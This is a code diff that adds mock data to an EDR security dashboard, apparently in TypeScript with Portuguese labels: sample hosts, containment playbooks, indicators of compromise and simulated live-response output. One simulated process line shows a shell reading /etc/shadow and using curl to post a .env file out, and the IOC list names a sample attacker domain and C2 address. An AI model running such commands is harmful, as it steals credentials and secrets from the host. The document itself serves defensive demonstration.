@@ -3,7 +3,11 @@ import {
   EdrBehavioralRule,
   EdrMemoryDumpAnalysis,
   EdrThreatHuntingQuery,
-  EdrLiveTelemetry
+  EdrLiveTelemetry,
+  EdrHostEndpoint,
+  EdrResponsePlaybook,
+  EdrIocItem,
+  EdrRtrCommandResult
 } from '../types/edr';
 
 export const INITIAL_PROCESS_TREES: EdrProcessNode[] = [
@@ -191,3 +195,180 @@ export const INITIAL_EDR_TELEMETRY: EdrLiveTelemetry = {
   networkSensorsActive: 16,
   tamperProtection: 'ENABLED (Protected Process Light)'
 };
+
+export const INITIAL_HOST_ENDPOINTS: EdrHostEndpoint[] = [
+  {
+    id: 'EP-001',
+    hostname: 'prod-api-gateway-01',
+    ip: '10.0.1.15',
+    macAddress: '02:42:0a:00:01:0f',
+    os: 'Ubuntu Linux 24.04 LTS (Kernel 6.8.0-31-generic eBPF)',
+    agentVersion: 'v4.2.1-kernel-prober',
+    isolationStatus: 'NORMAL',
+    containmentMode: 'NONE',
+    criticality: 'MISSION_CRITICAL',
+    activeAlertsCount: 3,
+    lastSeen: 'Agora (Tempo real)',
+    cpuLoad: 28.4,
+    memoryUsageMb: 3410
+  },
+  {
+    id: 'EP-002',
+    hostname: 'worker-node-k8s-pod-7',
+    ip: '10.0.2.88',
+    macAddress: '02:42:0a:00:02:58',
+    os: 'Debian GNU/Linux 12 (bookworm)',
+    agentVersion: 'v4.2.1-kernel-prober',
+    isolationStatus: 'NORMAL',
+    containmentMode: 'NONE',
+    criticality: 'HIGH',
+    activeAlertsCount: 1,
+    lastSeen: 'Há 12s',
+    cpuLoad: 64.2,
+    memoryUsageMb: 7890
+  },
+  {
+    id: 'EP-003',
+    hostname: 'db-primary-postgresql-pg01',
+    ip: '10.0.3.10',
+    macAddress: '02:42:0a:00:03:0a',
+    os: 'Red Hat Enterprise Linux 9.4 (Plow)',
+    agentVersion: 'v4.2.0-kernel-prober',
+    isolationStatus: 'NORMAL',
+    containmentMode: 'NONE',
+    criticality: 'MISSION_CRITICAL',
+    activeAlertsCount: 0,
+    lastSeen: 'Agora (Tempo real)',
+    cpuLoad: 14.1,
+    memoryUsageMb: 14200
+  },
+  {
+    id: 'EP-004',
+    hostname: 'devsecops-runner-ci-03',
+    ip: '10.0.4.52',
+    macAddress: '02:42:0a:00:04:34',
+    os: 'Alpine Linux v3.20 (musl)',
+    agentVersion: 'v4.2.1-kernel-prober',
+    isolationStatus: 'ISOLATED',
+    containmentMode: 'KERNEL_FILTER',
+    criticality: 'MEDIUM',
+    activeAlertsCount: 2,
+    lastSeen: 'Há 1m',
+    cpuLoad: 92.8,
+    memoryUsageMb: 2150
+  }
+];
+
+export const INITIAL_RESPONSE_PLAYBOOKS: EdrResponsePlaybook[] = [
+  {
+    id: 'PB-01',
+    name: 'Auto-Containment por Process Hollowing ou Shell Indevido',
+    triggerEvent: 'Disparo de regra CRITICAL (EDR-RULE-01 / EDR-RULE-03)',
+    description: 'Interrompe a árvore de processos maliciosos em tempo real via SIGKILL kernel, congela descritores de sockets e gera snapshot de memória.',
+    steps: [
+      '1. Kernel hook intercepta chamada fork/execve não autorizada',
+      '2. Envia sinal SIGKILL para árvore de processos (PID e filhos)',
+      '3. Coleta dump de memória volátil da região RWX para /var/log/edr/dumps',
+      '4. Bloqueia porta TCP/UDP e emite notificação para canal SOC/Webhook'
+    ],
+    executionType: 'AUTOMATED',
+    status: 'COMPLETED',
+    lastRun: 'Hoje, 08:44:12 (Processo PID 7921 eliminado)'
+  },
+  {
+    id: 'PB-02',
+    name: 'Quarentena de Binário e Validação de Reputação Hash',
+    triggerEvent: 'Arquivo gravado em /tmp ou /dev/shm com hash desconhecido',
+    description: 'Calcula SHA-256 e SHA-1, compara com base VirusTotal/Cthulhu e remove permissões de execução (chmod 000).',
+    steps: [
+      '1. Sensor inotify/eBPF detecta criação de executável em pasta temporária',
+      '2. Submete hash contra repositório local de IOCs',
+      '3. Aplica atributo imutável chattr +i e remove bit de execução',
+      '4. Move arquivo para cofre criptografado de quarentena'
+    ],
+    executionType: 'AUTOMATED',
+    status: 'READY'
+  },
+  {
+    id: 'PB-03',
+    name: 'Isolamento de Host em Rede (Host Network Isolation)',
+    triggerEvent: 'Múltiplos alertas de movimentação lateral e dumping de credenciais',
+    description: 'Corta todo tráfego IP de entrada e saída (IPTables / nftables DROP), mantendo unicamente túnel TLS seguro com o servidor SecScan EDR.',
+    steps: [
+      '1. Limpa regras de encaminhamento e estabelece default DROP em INPUT/OUTPUT',
+      '2. Insere exceção bidirecional apenas para a porta segura 443 do sensor SecScan',
+      '3. Encerra sessões SSH e VPNs ativas no endpoint',
+      '4. Sinaliza console de telemetria com status ISOLATED'
+    ],
+    executionType: 'HUMAN_CONFIRMATION',
+    status: 'READY'
+  }
+];
+
+export const INITIAL_IOC_ITEMS: EdrIocItem[] = [
+  {
+    id: 'IOC-001',
+    type: 'SHA256',
+    value: '4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a',
+    threatType: 'Reverse Shell Dropper (ELF)',
+    confidence: 99,
+    mitreRef: 'T1059.004',
+    action: 'BLOCK_AND_KILL',
+    dateAdded: 'Hoje, 08:44'
+  },
+  {
+    id: 'IOC-002',
+    type: 'IPV4',
+    value: '198.51.100.44',
+    threatType: 'Command & Control (C2) Listener',
+    confidence: 95,
+    mitreRef: 'T1071.001',
+    action: 'BLOCK_AND_KILL',
+    dateAdded: 'Hoje, 08:40'
+  },
+  {
+    id: 'IOC-003',
+    type: 'DOMAIN',
+    value: 'attacker-dropzone.ru',
+    threatType: 'Exfiltration Sinkhole / Dropzone',
+    confidence: 100,
+    mitreRef: 'T1048',
+    action: 'BLOCK_AND_KILL',
+    dateAdded: 'Hoje, 07:12'
+  },
+  {
+    id: 'IOC-004',
+    type: 'FILE_PATH',
+    value: '/tmp/payment-batch-trace.log',
+    threatType: 'Staging de Credenciais & Tokens',
+    confidence: 88,
+    mitreRef: 'T1074.001',
+    action: 'QUARANTINE',
+    dateAdded: 'Hoje, 06:15'
+  }
+];
+
+export const INITIAL_RTR_COMMANDS: EdrRtrCommandResult[] = [
+  {
+    id: 'RTR-01',
+    command: 'ps -eo pid,ppid,user,%cpu,%mem,cmd --sort=-%cpu | head -n 8',
+    output: `PID  PPID USER     %CPU %MEM CMD
+ 5124  2410 app-runner 18.2  4.1 node dist/server.cjs --port 3000
+ 7921  5124 app-runner 84.1  1.2 /bin/sh -c "cat /etc/shadow || curl -d @/app/.env..."
+ 2410  1402 root        2.3  1.5 /usr/bin/dockerd
+ 1402     1 root        0.1  0.4 /sbin/init`,
+    timestamp: 'Hoje, 08:44:10',
+    status: 'SUCCESS',
+    exitCode: 0
+  },
+  {
+    id: 'RTR-02',
+    command: 'netstat -tulpen | grep -E "(ESTABLISHED|LISTEN)"',
+    output: `tcp 0 0 0.0.0.0:3000 0.0.0.0:* LISTEN 5124/node
+tcp 0 1 10.0.1.15:52194 198.51.100.44:443 SYN_SENT 7921/sh
+tcp 0 0 10.0.1.15:48912 54.187.128.99:443 ESTABLISHED 5124/node`,
+    timestamp: 'Hoje, 08:44:11',
+    status: 'SUCCESS',
+    exitCode: 0
+  }
+];
